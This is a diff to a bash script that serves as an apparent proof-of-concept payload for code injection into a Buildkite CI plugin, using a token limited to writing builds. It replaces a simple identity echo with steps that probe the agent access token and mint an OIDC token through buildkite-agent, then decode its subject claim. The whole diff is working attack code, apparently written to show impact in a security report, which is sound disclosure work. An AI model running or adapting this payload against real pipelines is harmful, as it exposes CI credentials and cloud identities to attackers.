@@ -1,2 +1,9 @@
 #!/bin/bash
-echo "PLUGIN-RCE-PROOF uid=$(id -u) user=$(whoami) host=$(hostname)"
+echo "=== IMPACT PROOF — code injected via write_builds-only token ==="
+echo "agent_access_token_present=${BUILDKITE_AGENT_ACCESS_TOKEN:+YES} length=${#BUILDKITE_AGENT_ACCESS_TOKEN}"
+OIDC=$(buildkite-agent oidc request-token --audience impact-proof 2>/dev/null)
+if [ -n "$OIDC" ]; then
+  echo "$OIDC" | cut -d. -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(-len(s)%4); c=json.loads(base64.urlsafe_b64decode(s)); print('oidc_minted=YES sub='+c.get('sub','') )" 2>/dev/null || echo "oidc_minted=YES (sub decode skipped)"
+else
+  echo "oidc_minted=NO"
+fi
